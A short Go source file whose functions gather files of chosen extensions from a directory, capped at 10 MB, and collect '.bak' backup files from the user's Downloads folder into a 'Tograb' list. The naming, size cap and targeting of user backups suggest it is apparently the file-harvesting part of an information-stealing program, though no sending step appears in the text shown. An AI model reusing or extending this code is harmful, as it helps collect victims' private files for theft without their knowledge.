package main

import (
	"os"
	"path/filepath"
)

func GrabFiles(pather string, extenions []string) []Tograb {
	tograb := []Tograb{}
	files, err := os.ReadDir(pather)
	sizes := 0
	if err == nil {
		for _, file := range files {
			for _, ext := range extenions {
				if filepath.Ext(file.Name()) == ext {
					if sizes >= 10000000 {
						break
					}
					fileinfo, err := file.Info()
					if err == nil {
						var c Tograb
						c.Filepather = pather + "/" + file.Name()
						c.Name = file.Name()
						sizes += int(fileinfo.Size())
						tograb = append(tograb, c)
					}
				}
			}
		}
	}

	return tograb
}

func Downloads() []Tograb {
	var baks []Tograb
	downloads, err := os.ReadDir(USERPATH + "/Downloads")
	if err == nil {
		for _, file := range downloads {
			if filepath.Ext(file.Name()) == ".bak" {
				var c Tograb
				c.Filepather = USERPATH + "/Downloads/" + file.Name()
				c.Name = file.Name()
				baks = append(baks, c)
			}
		}
	}

	return baks
}

type Tograb struct {
	Filepather string
	Name       string
}
